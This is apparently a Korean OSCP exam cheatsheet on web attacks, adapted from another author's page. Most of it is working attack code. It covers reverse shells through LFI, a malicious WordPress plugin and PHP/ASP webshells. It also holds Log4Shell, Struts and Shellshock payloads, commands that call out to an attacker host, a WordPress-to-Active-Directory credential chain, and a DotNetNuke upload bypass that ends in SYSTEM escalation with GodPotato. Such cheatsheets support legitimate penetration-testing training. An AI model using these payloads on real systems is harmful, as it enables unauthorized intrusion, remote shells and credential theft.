---
title: "웹 공격 (Web Attacks)"
date: 2026-06-20
weight: 30
draft: false
tags: ["oscp", "cheatsheet"]
summary: "디렉터리 브루트포싱, CMS, LFI, 파일 업로드, SSTI, XXE까지 웹 공격 전반을 다루는 체크리스트."
---

웹 포트를 찾은 순간부터 돌리는 체크리스트. 디렉터리 브루트포싱, CMS, LFI, 파일 업로드, SSTI, XXE, DNN까지 웹 공격 전반을 다룬다.

- 출처: https://heretek.dev/oscp-cheatsheet/web-attacks/ (Jean Romero) — 재구성
- 변수: `$TARGET` = 공격 대상, `$KALI` = 공격자(Kali) IP
- 변수: `$ip` = 대상 웹 서버 IP (같은 의미로 혼용), 본문의 `ATTACKER`/`CALLBACK`은 자리표시자

## 정찰과 디렉터리 탐색 (Reconnaissance and Directory Discovery)

웹 포트를 찾는 즉시 병렬로 실행한다:

```bash
# Quick hits + common files
gobuster dir -u http://$ip -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -t 50

# Standard directory bust
ffuf -ac -t 60 -u http://$ip/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# CRITICAL: ALSO run with raft-large directories AND case-variant wordlists
# Lowercase-only wordlists MISS files like /CHANGELOG, /README, /API, /Admin
ffuf -ac -t 60 -u http://$ip/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
ffuf -ac -t 60 -u http://$ip/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt

# Virtual host discovery (if domain known)
ffuf -u http://$ip/ -H "Host: FUZZ.<domain>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <default_size>
```

스탠드얼론 웹 타깃에서는 아래 우선순위대로 전부 실행한다:

1. `raft-medium-directories.txt` — 빠른 1차 패스
2. `raft-large-directories.txt` — 대소문자 혼합. `/CHANGELOG`, `/Admin`, `/API`를 잡아낸다
3. `raft-large-files.txt` — 확장자 인지
4. `directory-list-2.3-medium.txt` — dirbuster 클래식
5. `common.txt` — 최후의 백업

일반적인 dev/info 파일은 대소문자 변형까지 수동으로 항상 확인한다:

```bash
for path in CHANGELOG README LICENSE VERSION TODO NOTES changelog readme; do
  curl -sI "http://$ip/$path" | head -1
done
```

AD 사용자명 열거용 직원 이름 목록 생성:

```bash
username-anarchy --input-file fullnames.txt --select-format first,flast,first.last,firstlast > usernames.txt
```

항상 수동으로 확인:

```bash
curl http://$ip/robots.txt
curl http://$ip/sitemap.xml
curl http://$ip/.git/HEAD
curl http://$ip/web.config
curl http://$ip/.env
curl http://$ip/wp-config.php.bak
curl http://$ip/phpinfo.php
```

모든 페이지에서 소스 보기: HTML 주석(크리덴셜/경로), 숨겨진 폼 필드, API 엔드포인트가 담긴 JS 파일, 버전 정보, 어드민 패널 링크를 찾는다.

## POST vs GET

GET이 에러를 내거나 빈 응답이면 POST를 시도한다:

```bash
curl http://$ip:PORT/endpoint
curl -d "" -X POST http://$ip:PORT/endpoint
curl -d "" -X POST -H "Content-Type: application/x-www-form-urlencoded" http://$ip:PORT/endpoint

# GET requests
curl http://$TARGET:<port>/
curl http://$TARGET:33333/<endpoint>

# POST requests
curl -s -i -X POST -H 'Content-Length: 0' http://$TARGET:<port>/<endpoint>
```

교훈: 고 포트 API(예: 33333)가 GET에서는 아무 응답이 없었다. Content-Length 헤더를 넣은 POST로 프로세스 목록이 노출됐고, 그 안에 하드코딩된 크리덴셜이 있었다. GET이 비어 보이면 항상 POST를 시도한다.

### LFI → RCE 리버스 셸 (알려진/업로드된 PHP 셸 경유)

```bash
# bash reverse shell through the shell's cmd parameter
curl -sG "http://$TARGET/index.php" \
  --data-urlencode "file=simple_shell.php" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/$KALI/443 0>&1'"

# python3 reverse shell
curl -sG "http://$TARGET/index.php" \
  --data-urlencode "file=simple_shell.php" \
  --data-urlencode "cmd=python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$KALI\",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"

# mkfifo reverse shell
curl -sG "http://$TARGET/index.php" \
  --data-urlencode "file=simple_shell.php" \
  --data-urlencode "cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $KALI 443 >/tmp/f"
```

아웃바운드가 필터링돼 있으면 어떤 이그레스 포트가 열려 있는지 먼저 찾고, 그 포트로 셸을 쏜다:

```bash
# 1. Listen on Kali for probes
sudo tcpdump -ni tun0 "tcp and host $TARGET and (port 443 or port 80 or port 53)"

# 2. Fire timeout probes to common egress ports (whichever shows a SYN in tcpdump is open)
curl -sG 'http://$TARGET/index.php?file=....//....//....//<path>/simpleshell.php' --data-urlencode 'cmd=timeout 3 bash -c "echo x > /dev/tcp/$KALI/443"'
curl -sG 'http://$TARGET/index.php?file=....//....//....//<path>/simpleshell.php' --data-urlencode 'cmd=timeout 3 bash -c "echo x > /dev/tcp/$KALI/80"'

# 3. Base64-encode the reverse shell and fire it on the working port
echo -n 'bash -i >& /dev/tcp/$KALI/443 0>&1' | base64
rlwrap nc -lvnp 443
```

## CMS 식별과 익스플로잇 (CMS Identification and Exploitation)

```bash
wpscan --url http://$ip --enumerate p --plugins-detection aggressive
droopescan scan drupal -u http://$ip
joomscan --url http://$ip
```

모든 CMS 공통: `searchsploit <CMS> <version>` → 비인증 익스플로잇부터 확인한다.

## WordPress 익스플로잇 (WordPress Exploitation)

체인: WordPress → wp-config.php → MySQL → 해시 덤프 → 크랙 → AD 스프레이

### Phase 0 — /etc/hosts에 호스트명 추가

```bash
# WordPress often redirects to a hostname — map it so links/wp-json resolve
echo "$ip wordpress.local" | sudo tee -a /etc/hosts
```

### Phase 1 — WPScan 열거

```bash
wpscan --url http://TARGET --enumerate p,t,u --plugins-detection aggressive
curl http://TARGET/wp-json/wp/v2/users
```

### Phase 2 — WordPress 로그인 브루트포스

```bash
wpscan --url http://TARGET --password-attack xmlrpc -U admin -P /path/to/wordlist -t 30
```

### Phase 3 — WordPress 어드민 → 셸 (5가지 방법)

1. 테마 에디터 (404.php) → `http://TARGET/wp-content/themes/THEME_NAME/404.php`
2. 악성 플러그인 업로드 — 아래 내용으로:

```text
<?php
/**
* Plugin Name: Starter Plugin
* Version: 1.0
*/
exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'");
?>
```

   이어서: `zip revshell.zip revshell.php` → Plugins → Add New → Upload → Activate
3. Metasploit → `exploit/unix/webapp/wp_admin_shell_upload`
4. 플러그인 에디터 → 기존 플러그인 PHP 파일 수정
5. 빠른 웹셸:

```text
<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; system($_REQUEST["cmd"]); echo "</pre>"; die; } ?>
```

### Phase 4 — wp-config.php → MySQL → 크리덴셜 덤프

```bash
cat /var/www/html/wp-config.php
```

### Phase 5 — MySQL DB 익스플로잇

```sql
mysql -u DB_USER -p'DB_PASS' -h localhost DB_NAME
SELECT user_login, user_pass FROM wp_users;
SELECT concat_ws(':', user_login, user_pass) FROM wp_users;
```

### Phase 6 — WordPress 해시 크랙

```bash
hashcat -m 400 hashes.txt /usr/share/wordlists/rockyou.txt
john --format=phpass hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Phase 7 — AD 스프레이

```bash
nxc smb DC_IP -u userlist.txt -p 'wordpress_password' --continue-on-success
nxc winrm DC_IP -u username -p 'cracked_wp_hash'
```

## 인증 테스트 (Authentication Testing)

모든 로그인에 시도: `admin:admin`, `admin:password`, `admin:Password1`, `root:root`, `tomcat:s3cret`, `postgres:postgres`, `sa:sa`, `Company2024!`

## SQLi

범위: 탐지 체크리스트(7개 테스트), 인증 우회, 에러 기반(MySQL/MSSQL/PostgreSQL), UNION 기반(전체 DB), stacked queries → xp_cmdshell RCE, blind(boolean·time), Python 추출 스크립트, INTO OUTFILE 웹셸, WAF 우회. 상세는 [sql-injection.md](sql-injection.md).

MSSQL(IIS + ASP.NET)이면 stacked queries를 먼저: `'; WAITFOR DELAY '0:0:5'--` — 지연되면 UNION은 버리고 바로 xp_cmdshell로 간다.

## LFI

테스트 페이로드:

```text
?page=../../../etc/passwd
?page=....//....//....//etc/passwd
?page=..%2f..%2f..%2fetc%2fpasswd
curl -s "http://target/index.php?file=....//....//....//etc/passwd"
?page=php://filter/convert.base64-encode/resource=index.php
?page=php:
?page=data://text/plain,<?php system('id'); ?>
```

Windows LFI 경로:

```text
?page=C:/windows/system32/drivers/etc/hosts
?page=C:/inetpub/wwwroot/web.config
?page=C:/xampp/apache/conf/httpd.conf
```

Windows LFI로 읽을 파일 (우선순위):

```text
C:/xampp/htdocs/dashboard/phpinfo.php
C:/xampp/apache/conf/httpd.conf
C:/xampp/php/php.ini
C:/xampp/phpMyAdmin/config.inc.php
C:/xampp/tomcat/conf/tomcat-users.xml
C:/inetpub/wwwroot/web.config
C:/windows/system32/drivers/etc/hosts
C:/xampp/htdocs/wp-config.php
```

### 웹 루트 위치 (Web Root Locations)

- Apache (XAMPP) / Windows → `C:\xampp\htdocs\`
- Apache / Linux → `/var/www/html/`
- IIS / Windows → `C:\inetpub\wwwroot\`
- nginx / Linux → `/var/www/html/`
- Tomcat / 공통 → `webapps/`

### LFI → RCE

- 로그 포이즈닝: User-Agent에 `<?php system($_GET['cmd']); ?>` 주입 → `/var/log/apache2/access.log` 인클루드

PHP 래퍼:

```text
?page=php://input    (POST: <?php system('bash -i >& /dev/tcp/ATTACKER/4444 0>&1'); ?>)
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=whoami
```

SSH 등 어떤 셸이라도 이미 있고 localhost 서비스에 LFI가 발견됐다면, PHP 웹셸을 쓰고 LFI로 인클루드한다:

```bash
# Write webshell to a writable directory
echo '<?php system($_GET["cmd"]); ?>' > /dev/shm/shell.php
# Include it via LFI
curl "http://127.0.0.1:8000/backend/?view=../../../../../dev/shm/shell.php&cmd=id"
```

쓰기 가능 디렉터리 시도 순서:

1. `/dev/shm` — 공유 메모리, 전역 쓰기 가능, noexec 없음 (최선)
2. `/var/tmp` — 재부팅 후에도 유지
3. `/tmp` — noexec 마운트인 경우가 있어 마지막에 시도
4. `/run/shm` — 일부 배포판에서 /dev/shm의 별칭

### RFI (allow_url_include=On인 경우)

```text
?page=http://ATTACKER/shell.php
```

## 커맨드 인젝션 (Command Injection)

```text
; whoami
| whoami
|| whoami
&& whoami
`whoami`
$(whoami)
%0a whoami
```

Blind 확인: `; ping -c 3 ATTACKER_IP` → `sudo tcpdump -i tun0 icmp`

## 파일 업로드 (File Upload)

순서대로 시도: 정상 확장자 → 대체 확장자(`.phtml`, `.php5`) → 이중 확장자(`shell.php.jpg`) → 널 바이트(`shell.php%00.jpg`) → Content-Type 스푸핑 → 매직 바이트(`GIF89a`) → `.htaccess` 트릭 → 대소문자 변형 → IIS 트릭(`shell.asp;.jpg`)

최소 웹셸:

```text
<?php system($_GET['cmd']); ?>
```

```text
<% Set o = Server.CreateObject("WSCRIPT.SHELL") : Set x = o.exec("cmd /c " & Request("cmd")) : Response.Write x.StdOut.ReadAll %>
```

## SSTI

탐지: `${{ <%[%'"}}%\` → 이어서 `{{7*7}}` → 49가 나오면 Jinja2/Twig, `${7*7}` → FreeMarker

Jinja2 RCE:

```text
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

Twig RCE:

```text
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
```

## Java 백엔드 RCE (Tomcat / Spring / JBoss / Struts)

백엔드가 Java라는 징후:

- nmap이 `Apache Tomcat`, `Jetty`, `JBoss`, `WebLogic` 표시
- nmap favicon 라인: `Spring Java Framework`
- HTTP 헤더: `X-Powered-By: Servlet`, `Server: Apache-Coyote`
- 쿠키: `JSESSIONID`
- API 엔드포인트가 `Content-Type: text/plain;charset=UTF-8`로 응답 (Tomcat 기본값)
- 확장자 `.jsp`, `.do`, `.action`

퍼징 목록 — 리플렉트되는 파라미터, 헤더, User-Agent, Cookie에 하나씩 넣어 본다. DNS 콜백 또는 sleep/지연을 관찰한다:

```text
${jndi:ldap://CALLBACK/x}                                          # Log4Shell - CVE-2021-44228
${jndi:dns://CALLBACK}                                             # Log4Shell variant
${dns:address|CALLBACK}                                            # Text4Shell - CVE-2022-42889
${url:UTF-8:http://CALLBACK/}                                      # Text4Shell variant
${script:javascript:java.lang.Runtime.getRuntime().exec("sleep 10")}   # Text4Shell visible
T(java.lang.Runtime).getRuntime().exec("sleep 10")                 # Spring SpEL
%{(#cmd='id').(@java.lang.Runtime@getRuntime().exec(#cmd))}        # Struts2 OGNL - CVE-2017-5638
class.module.classLoader.URLs[0]=                                  # Spring4Shell - CVE-2022-22965
```

페이로드가 반응하면(지연/콜백) 전체 RCE 문법은 아래에서 찾는다:

- HackTricks: book.hacktricks.wiki (Java RCE / Tomcat / Spring 페이지)
- PayloadsAllTheThings: github.com/swisskyrepo/PayloadsAllTheThings (Java 페이지)

그 외 확인할 Java 진입점:

- Tomcat manager: `/manager/html` + 기본 크리덴셜 (`tomcat:tomcat`, `admin:admin`, `tomcat:s3cret`) → WAR 업로드
- Spring Actuator: `/actuator`, `/actuator/env`, `/actuator/heapdump`, `/actuator/mappings`
- JBoss: `/jmx-console`, `/web-console`, `/invoker/JMXInvokerServlet`

DNS 콜백 준비 (시험 중에는 인터넷이 없다 — 로컬 전용):

```bash
# Listen for DNS lookups from target on tun0
sudo tcpdump -i tun0 -n 'port 53' -A
# Use your own Kali tun0 IP as the callback host in payloads.
# Works for ${dns:...} and ${url:...} probes that resolve hostnames.
# For ${jndi:ldap://...} you need an LDAP server (marshalsec) — different setup.
```

## XXE

```text
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

## Shellshock (CVE-2014-6271)

```bash
curl -H "User-Agent: () { :; }; echo; /usr/bin/id" http://$ip/cgi-bin/script.sh
curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1" http://$ip/cgi-bin/script.sh
```

## SSRF

```text
?url=http://127.0.0.1:8080/admin
?url=http://169.254.169.254/latest/meta-data/
?url=file:///etc/passwd
```

## URL 쿼리 파라미터를 입력으로 쓰기

`?`가 쿼리 스트링의 시작이다. `http://target/?whoami` = `?` 뒤가 명령이다.

## DotNetNuke (DNN) 익스플로잇

### 식별 (Recognition)

- DNN 브랜딩이 있는 /Login 페이지
- URL에 Portals/0/
- HTTP 응답 헤더에 DNN 또는 DotNetNuke 언급
- 기본 포털 디렉터리: /Portals/0/

### 기본 크리덴셜 (Default Credentials)

```text
admin : password
host : dnnhost
```

무엇보다 먼저 /Login에서 이것들을 시도한다.

### 기본 크리덴셜이 변경됐다면: MSSQL 패스워드 확인

```sql
SELECT * FROM dbo.aspnet_Membership;
```

- 패스워드를 SQL로 업데이트하는 건 salt+PBKDF2 때문에 까다롭다.
- 더 쉬운 방법: HostSettings 테이블에서 어드민 계정 잠금 상태를 확인한다.

### 포스트 인증 익스플로잇: 파일 업로드 확장자 우회

DNN은 기본적으로 .aspx 업로드를 막는다. aspx 웹셸을 올리려면:

1. /Login에서 admin으로 로그인
2. Persona Bar → Settings → Security → More → More Security Settings
3. 'Allowable File Extensions' 찾기 (HostSettings 테이블, SettingName='FileExtensions')
4. 쉼표 목록에 'aspx' 추가
5. 저장

```sql
UPDATE HostSettings SET SettingValue = 'bmp,gif,ico,jpeg,jpg,jpe,png,svg,aspx,asp,ashx' WHERE SettingName = 'FileExtensions';
```

### 웹셸 업로드

- Admin → File Management → cmdasp.aspx 업로드
- 또는 Persona Bar → File Management

### 웹셸 접근

```text
http://TARGET/Portals/0/cmdasp.aspx
```

포털 ID 0이 기본 포털의 업로드 루트다. 다른 포털은 /Portals/1/ 등에 위치한다.

### 웹셸에서 권한 상승 (Privesc from Webshell)

IIS AppPool 신원은 SeImpersonatePrivilege를 가진다. GodPotato 또는 PrintSpoofer로 SYSTEM까지 간다.

```bash
whoami /priv
# Download tools
powershell -c "iwr http://KALI/GodPotato-NET4.exe -o C:\Windows\Temp\gp.exe"
powershell -c "iwr http://KALI/nc.exe -o C:\Windows\Temp\nc.exe"
# Listener on Kali
C:\Windows\Temp\gp.exe -cmd "C:\Windows\Temp\nc.exe KALI 4444 -e cmd.exe"
```

전형적 체인: /Login 기본 크리덴셜 → aspx 확장자 허용 목록 우회 → 웹셸 → SeImpersonate privesc (GodPotato/PrintSpoofer) → SYSTEM

## 빠른 참조 링크 (같은 폴더 문서)

- 전체 흐름 → [methodology.md](methodology.md)
- SQL 인젝션 상세 → [sql-injection.md](sql-injection.md)
